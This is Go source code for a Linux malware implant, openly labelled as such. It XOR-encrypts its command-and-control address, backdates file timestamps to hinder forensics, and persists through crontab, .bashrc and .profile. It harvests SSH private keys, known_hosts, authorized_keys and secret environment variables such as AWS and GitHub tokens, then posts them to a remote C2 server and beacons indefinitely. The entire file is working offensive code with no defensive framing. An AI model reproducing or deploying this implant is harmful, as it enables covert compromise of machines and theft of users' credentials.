package main

import (
  "bytes"
  "crypto/rand"
  "encoding/hex"
  "encoding/json"
  "fmt"
  "io"
  "io/ioutil"
  "net/http"
  "os"
  "os/exec"
  "os/user"
  "path/filepath"
  "runtime"
  "strings"
  "syscall"
  "time"
)

/*
╔════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗ ██████╗███████╗           ║
║    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝██╔════╝           ║
║    ██████╔╝██║     ███████║██║     █████╔╝ ██║██║     █████╗             ║
║    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║██║     ██╔══╝             ║
║    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║╚██████╗███████╗           ║
║    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚══════╝           ║
║                                                                            ║
║                       LINUX ULTIMATE IMPLANT                               ║
║                                                                            ║
║  Features:                                                                 ║
║  ✓ Encrypted C2 Server Configuration (XOR)                                ║
║  ✓ File Timestomping (Anti-Forensics)                                     ║
║  ✓ Multiple Persistence Mechanisms                                        ║
║  ✓ Background Daemon Execution                                            ║
║  ✓ SSH Private Key Harvesting                                             ║
║  ✓ Bash History Collection                                                ║
║  ✓ System Reconnaissance                                                  ║
║  ✓ Network Information Gathering                                          ║
║  ✓ Infinite C2 Beaconing                                                  ║
║  ✓ Auto-Cleanup Capabilities                                              ║
║  ✓ Survives System Reboot                                                 ║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝
*/

// ============================================================================
// CONFIGURATION - Build-time encrypted values
// ============================================================================

var (
  // Encrypted C2 configuration (set during build with -ldflags -X)
  ENCRYPTED_C2_SERVER = "d2aea8a89bcfcfc89bcb9bcb" // XOR encrypted IP
  ENCRYPTED_C2_PORT   = "9d9d9a9e"                 // XOR encrypted port
  XOR_KEY             = byte(0xC3)                  // Encryption key
  
  // Decoy values to confuse static analysis
  DECOY_SERVER_1 = "127.0.0.1"
  DECOY_SERVER_2 = "8.8.8.8"
  DECOY_URL      = "https://www.google.com  "
)

// ============================================================================
// STRUCTURES
// ============================================================================

type Config struct {
  C2Server       string
  C2Port         int
  BeaconInterval int
  EnableRecon    bool
  EnableCreds    bool
  EnablePersist  bool
  AutoCleanup    bool
}

type SessionInfo struct {
  SessionID   string
  Hostname    string
  Username    string
  HomeDir     string
  OS          string
  Arch        string
  Kernel      string
  UID         int
  GID         int
  Shell       string
  StartTime   time.Time
}

// ============================================================================
// GLOBAL VARIABLES
// ============================================================================

var (
  config      Config
  sessionInfo SessionInfo
  c2Client    *http.Client
  artifacts   []string // Files to cleanup
)

// ============================================================================
// ENCRYPTION & DECRYPTION
// ============================================================================

// XOR encryption/decryption (symmetric)
func xorCrypt(input string, key byte) string {
  output := make([]byte, len(input))
  for i := 0; i < len(input); i++ {
    output[i] = input[i] ^ key
  }
  return string(output)
}

// Decrypt hex-encoded XOR encrypted string
func decryptHex(encryptedHex string, key byte) string {
  encrypted, err := hex.DecodeString(encryptedHex)
  if err != nil {
    return ""
  }
  return xorCrypt(string(encrypted), key)
}

// Get C2 configuration by decrypting build-time values
func getC2Config() (string, int) {
  server := decryptHex(ENCRYPTED_C2_SERVER, XOR_KEY)
  portStr := decryptHex(ENCRYPTED_C2_PORT, XOR_KEY)
  
  var port int
  fmt.Sscanf(portStr, "%d", &port)
  
  // Fallback to defaults if decryption fails
  if server == "" {
    server = "127.0.0.1"
  }
  if port == 0 {
    port = 8443
  }
  
  return server, port
}

// ============================================================================
// TIMESTOMPING (ANTI-FORENSICS)
// ============================================================================

// Modify file timestamps to look old (evade timeline analysis)
func timestomp(filePath string) error {
  // Set to Ubuntu 18.04 LTS release date (looks legitimate and old)
  oldTime := time.Date(2018, 4, 26, 8, 0, 0, 0, time.Local)
  
  // Linux only supports Access and Modify times via syscall
  tv := []syscall.Timeval{
    {Sec: oldTime.Unix()}, // Access time
    {Sec: oldTime.Unix()}, // Modify time
  }
  
  return syscall.Utimes(filePath, tv)
}

// Timestomp multiple files
func timestompMultiple(paths []string) {
  for _, path := range paths {
    timestomp(path)
  }
}

// ============================================================================
// PERSISTENCE MECHANISMS
// ============================================================================

// Install all persistence mechanisms
func installPersistence() string {
  exe, err := os.Executable()
  if err != nil {
    return ""
  }
  
  home, err := os.UserHomeDir()
  if err != nil {
    return ""
  }
  
  // Create hidden directory
  configDir := filepath.Join(home, ".config")
  os.MkdirAll(configDir, 0755)
  
  // Copy to hidden location with legitimate-looking name
  target := filepath.Join(configDir, ".systemd-daemon")
  
  // Copy executable
  if err := copyFile(exe, target); err != nil {
    return ""
  }
  
  // Make executable
  os.Chmod(target, 0755)
  
  // Timestomp the copied file
  timestomp(target)
  
  // Install persistence methods
  installCrontabPersistence(target)
  installBashrcPersistence(target)
  installProfilePersistence(target)
  
  artifacts = append(artifacts, target)
  
  return target
}

// Crontab persistence (@reboot)
func installCrontabPersistence(execPath string) error {
  cronEntry := fmt.Sprintf("@reboot %s >/dev/null 2>&1", execPath)
  
  // Get existing crontab
  cmd := exec.Command("bash", "-c", "crontab -l 2>/dev/null")
  existing, _ := cmd.Output()
  
  // Check if already installed
  if strings.Contains(string(existing), execPath) {
    return nil
  }
  
  // Add new entry
  newCrontab := string(existing) + "\n" + cronEntry + "\n"
  
  cmd = exec.Command("bash", "-c", fmt.Sprintf("echo '%s' | crontab -", newCrontab))
  return cmd.Run()
}

// .bashrc persistence
func installBashrcPersistence(execPath string) error {
  home, _ := os.UserHomeDir()
  bashrc := filepath.Join(home, ".bashrc")
  
  // Read existing content
  content, err := ioutil.ReadFile(bashrc)
  if err != nil {
    return err
  }
  
  // Check if already installed
  if strings.Contains(string(content), execPath) {
    return nil
  }
  
  // Append stealth entry
  entry := fmt.Sprintf("\n# System daemon\n%s &\n", execPath)
  
  f, err := os.OpenFile(bashrc, os.O_APPEND|os.O_WRONLY, 0644)
  if err != nil {
    return err
  }
  defer f.Close()
  
  _, err = f.WriteString(entry)
  return err
}

// .profile persistence (backup method)
func installProfilePersistence(execPath string) error {
  home, _ := os.UserHomeDir()
  profile := filepath.Join(home, ".profile")
  
  content, err := ioutil.ReadFile(profile)
  if err != nil {
    return err
  }
  
  if strings.Contains(string(content), execPath) {
    return nil
  }
  
  entry := fmt.Sprintf("\n%s >/dev/null 2>&1 &\n", execPath)
  
  f, err := os.OpenFile(profile, os.O_APPEND|os.O_WRONLY, 0644)
  if err != nil {
    return err
  }
  defer f.Close()
  
  _, err = f.WriteString(entry)
  return err
}

// ============================================================================
// DAEMONIZATION
// ============================================================================

// Daemonize process (detach from terminal and run in background)
func daemonize() {
  // Check if already daemonized (parent PID = 1 means adopted by init)
  if os.Getppid() == 1 {
    return
  }
  
  // Fork and run in background
  cmd := exec.Command(os.Args[0])
  cmd.Stdout = nil
  cmd.Stderr = nil
  cmd.Stdin = nil
  cmd.Start()
  
  // Exit parent process
  os.Exit(0)
}

// ============================================================================
// FILE OPERATIONS
// ============================================================================

// Copy file from src to dst
func copyFile(src, dst string) error {
  sourceFile, err := os.Open(src)
  if err != nil {
    return err
  }
  defer sourceFile.Close()
  
  destFile, err := os.Create(dst)
  if err != nil {
    return err
  }
  defer destFile.Close()
  
  _, err = io.Copy(destFile, sourceFile)
  if err != nil {
    return err
  }
  
  return destFile.Sync()
}

// ============================================================================
// C2 COMMUNICATION
// ============================================================================

// Generate unique session ID
func generateSessionID() string {
  b := make([]byte, 16)
  rand.Read(b)
  return hex.EncodeToString(b)
}

// Initialize session information
func initSessionInfo() {
  sessionInfo.SessionID = generateSessionID()
  sessionInfo.Hostname, _ = os.Hostname()
  sessionInfo.OS = runtime.GOOS
  sessionInfo.Arch = runtime.GOARCH
  sessionInfo.StartTime = time.Now()
  
  currentUser, err := user.Current()
  if err == nil {
    sessionInfo.Username = currentUser.Username
    sessionInfo.HomeDir = currentUser.HomeDir
    sessionInfo.UID, _ = parseInt(currentUser.Uid)
    sessionInfo.GID, _ = parseInt(currentUser.Gid)
  }
  
  // Get kernel version
  cmd := exec.Command("uname", "-r")
  out, err := cmd.Output()
  if err == nil {
    sessionInfo.Kernel = strings.TrimSpace(string(out))
  }
  
  // Get shell
  sessionInfo.Shell = os.Getenv("SHELL")
}

// Send beacon to C2 server
func sendBeacon(beaconType string, data map[string]interface{}) bool {
  payload := map[string]interface{}{
    "session_id": sessionInfo.SessionID,
    "type":       beaconType,
    "timestamp":  time.Now().Unix(),
    "hostname":   sessionInfo.Hostname,
    "username":   sessionInfo.Username,
    "os":         sessionInfo.OS,
    "arch":       sessionInfo.Arch,
    "data":       data,
  }
  
  jsonData, err := json.Marshal(payload)
  if err != nil {
    return false
  }
  
  url := fmt.Sprintf("http://%s:%d/beacon", config.C2Server, config.C2Port)
  
  req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
  if err != nil {
    return false
  }
  
  req.Header.Set("Content-Type", "application/json")
  req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
  
  resp, err := c2Client.Do(req)
  if err != nil {
    return false
  }
  defer resp.Body.Close()
  
  return resp.StatusCode == 200
}

// ============================================================================
// RECONNAISSANCE
// ============================================================================

// Execute full system reconnaissance
func executeRecon() map[string]interface{} {
  recon := map[string]interface{}{
    "hostname":  sessionInfo.Hostname,
    "username":  sessionInfo.Username,
    "home":      sessionInfo.HomeDir,
    "os":        sessionInfo.OS,
    "arch":      sessionInfo.Arch,
    "kernel":    sessionInfo.Kernel,
    "uid":       sessionInfo.UID,
    "gid":       sessionInfo.GID,
    "shell":     sessionInfo.Shell,
    "uptime":    getUptime(),
    "network":   getNetworkInfo(),
    "processes": getProcessCount(),
    "users":     getLoggedInUsers(),
  }
  
  sendBeacon("recon", recon)
  return recon
}

// Get system uptime
func getUptime() string {
  cmd := exec.Command("uptime", "-p")
  out, err := cmd.Output()
  if err != nil {
    return "unknown"
  }
  return strings.TrimSpace(string(out))
}

// Get network information
func getNetworkInfo() map[string]interface{} {
  netInfo := make(map[string]interface{})
  
  // IP addresses
  cmd := exec.Command("hostname", "-I")
  out, err := cmd.Output()
  if err == nil {
    netInfo["ips"] = strings.Fields(string(out))
  }
  
  // Network interfaces
  cmd = exec.Command("ip", "link", "show")
  out, err = cmd.Output()
  if err == nil {
    netInfo["interfaces"] = parseInterfaces(string(out))
  }
  
  return netInfo
}

// Parse network interfaces
func parseInterfaces(output string) []string {
  var interfaces []string
  lines := strings.Split(output, "\n")
  for _, line := range lines {
    if strings.Contains(line, ":  ") && !strings.HasPrefix(line, " ") {
      parts := strings.Split(line, ": ")
      if len(parts) >= 2 {
        iface := strings.TrimSpace(parts[1])
        iface = strings.Split(iface, ": ")[0]
        interfaces = append(interfaces, iface)
      }
    }
  }
  return interfaces
}

// Get process count
func getProcessCount() int {
  cmd := exec.Command("bash", "-c", "ps aux | wc -l")
  out, err := cmd.Output()
  if err != nil {
    return 0
  }
  count, _ := parseInt(strings.TrimSpace(string(out)))
  return count
}

// Get logged in users
func getLoggedInUsers() []string {
  cmd := exec.Command("who")
  out, err := cmd.Output()
  if err != nil {
    return []string{}
  }
  
  var users []string
  lines := strings.Split(string(out), "\n")
  for _, line := range lines {
    if line == "" {
      continue
    }
    fields := strings.Fields(line)
    if len(fields) > 0 {
      users = append(users, fields[0])
    }
  }
  return users
}

// ============================================================================
// CREDENTIAL HARVESTING
// ============================================================================

// Execute credential harvesting
func executeCredentials() map[string]interface{} {
  creds := map[string]interface{}{}
  
  // SSH private keys
  sshKeys := harvestSSHKeys()
  if len(sshKeys) > 0 {
    creds["ssh_keys"] = sshKeys
  }
  
  // Bash history
  historyPath := getBashHistory()
  if historyPath != "" {
    creds["bash_history"] = historyPath
  }
  
  // Known hosts
  knownHosts := getKnownHosts()
  if len(knownHosts) > 0 {
    creds["known_hosts"] = knownHosts
  }
  
  // Authorized keys
  authKeys := getAuthorizedKeys()
  if len(authKeys) > 0 {
    creds["authorized_keys"] = authKeys
  }
  
  // Environment variables (may contain secrets)
  envVars := getInterestingEnvVars()
  if len(envVars) > 0 {
    creds["env_vars"] = envVars
  }
  
  sendBeacon("credentials", creds)
  return creds
}

// Harvest SSH private keys
func harvestSSHKeys() []string {
  var keys []string
  home, err := os.UserHomeDir()
  if err != nil {
    return keys
  }
  
  sshDir := filepath.Join(home, ".ssh")
  files, err := ioutil.ReadDir(sshDir)
  if err != nil {
    return keys
  }
  
  for _, f := range files {
    // Look for private keys (id_rsa, id_ed25519, etc.)
    if strings.HasPrefix(f.Name(), "id_") && !strings.HasSuffix(f.Name(), ".pub") {
      keyPath := filepath.Join(sshDir, f.Name())
      keys = append(keys, keyPath)
      
      // Exfiltrate key content
      content, err := ioutil.ReadFile(keyPath)
      if err == nil {
        exfilPath := filepath.Join(os.TempDir(), "exfil_"+f.Name())
        ioutil.WriteFile(exfilPath, content, 0600)
        artifacts = append(artifacts, exfilPath)
      }
    }
  }
  
  return keys
}

// Get bash history location
func getBashHistory() string {
  home, _ := os.UserHomeDir()
  histFile := filepath.Join(home, ".bash_history")
  
  if _, err := os.Stat(histFile); err == nil {
    return histFile
  }
  
  return ""
}

// Get known hosts
func getKnownHosts() []string {
  home, _ := os.UserHomeDir()
  knownHostsFile := filepath.Join(home, ".ssh", "known_hosts")
  
  content, err := ioutil.ReadFile(knownHostsFile)
  if err != nil {
    return []string{}
  }
  
  lines := strings.Split(string(content), "\n")
  var hosts []string
  for _, line := range lines {
    if line != "" && !strings.HasPrefix(line, "#") {
      hosts = append(hosts, line)
    }
  }
  
  return hosts
}

// Get authorized keys
func getAuthorizedKeys() []string {
  home, _ := os.UserHomeDir()
  authKeysFile := filepath.Join(home, ".ssh", "authorized_keys")
  
  content, err := ioutil.ReadFile(authKeysFile)
  if err != nil {
    return []string{}
  }
  
  lines := strings.Split(string(content), "\n")
  var keys []string
  for _, line := range lines {
    if line != "" && !strings.HasPrefix(line, "#") {
      keys = append(keys, line)
    }
  }
  
  return keys
}

// Get interesting environment variables
func getInterestingEnvVars() map[string]string {
  interesting := []string{
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "GITHUB_TOKEN",
    "API_KEY",
    "PASSWORD",
    "SECRET",
    "TOKEN",
  }
  
  envVars := make(map[string]string)
  
  for _, key := range interesting {
    if val := os.Getenv(key); val != "" {
      envVars[key] = val
    }
  }
  
  return envVars
}

// ============================================================================
// CLEANUP
// ============================================================================

// Cleanup temporary artifacts
func cleanup() {
  if !config.AutoCleanup {
    return
  }
  
  for _, artifact := range artifacts {
    // Only remove temporary exfiltration files, not the persistent implant
    if strings.Contains(artifact, "exfil_") || strings.Contains(artifact, "creds_") {
      os.Remove(artifact)
    }
  }
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

// Parse string to int
func parseInt(s string) (int, error) {
  var result int
  _, err := fmt.Sscanf(s, "%d", &result)
  return result, err
}

// ============================================================================
// MAIN FUNCTION
// ============================================================================

func main() {
  // Decrypt C2 configuration
  c2Server, c2Port := getC2Config()
  
  // Initialize configuration
  config = Config{
    C2Server:       c2Server,
    C2Port:         c2Port,
    BeaconInterval: 60, // Beacon every 60 seconds
    EnableRecon:    true,
    EnableCreds:    true,
    EnablePersist:  true,
    AutoCleanup:    true,
  }
  
  // Initialize HTTP client
  c2Client = &http.Client{
    Timeout: 10 * time.Second,
  }
  
  // Initialize session info
  initSessionInfo()
  
  // Daemonize (run in background)
  daemonize()
  
  // Install persistence
  var persistentPath string
  if config.EnablePersist {
    persistentPath = installPersistence()
  }
  
  // If we're the original file (not the persistent copy), exit
  exe, _ := os.Executable()

  // If we're NOT the persistent copy, exit and let persistent copy run
  if exe != persistentPath && persistentPath != "" {
      // Launch the persistent copy
      cmd := exec.Command(persistentPath)
      cmd.Start()

      time.Sleep(2 * time.Second)
      os.Exit(0)
  }
  
  // Initial check-in
  sendBeacon("checkin", map[string]interface{}{
    "status": "initialized",
  })
  
  // Execute reconnaissance
  if config.EnableRecon {
    executeRecon()
  }
  
  // Harvest credentials
  if config.EnableCreds {
    executeCredentials()
  }
  
  // Main beacon loop (runs forever)
  beaconCount := 0
  failureCount := 0
  maxFailures := 10
  
  for {
    time.Sleep(time.Duration(config.BeaconInterval) * time.Second)
    beaconCount++
    
    success := sendBeacon("heartbeat", map[string]interface{}{
      "status":       "active",
      "beacon_count": beaconCount,
      "failure_count": failureCount,
    })
    
    if success {
      failureCount = 0
    } else {
      failureCount++
      
      // If too many failures, increase beacon interval (slow down)
      if failureCount >= maxFailures {
        time.Sleep(5 * time.Minute)
        failureCount = 0
      }
    }
  }
}
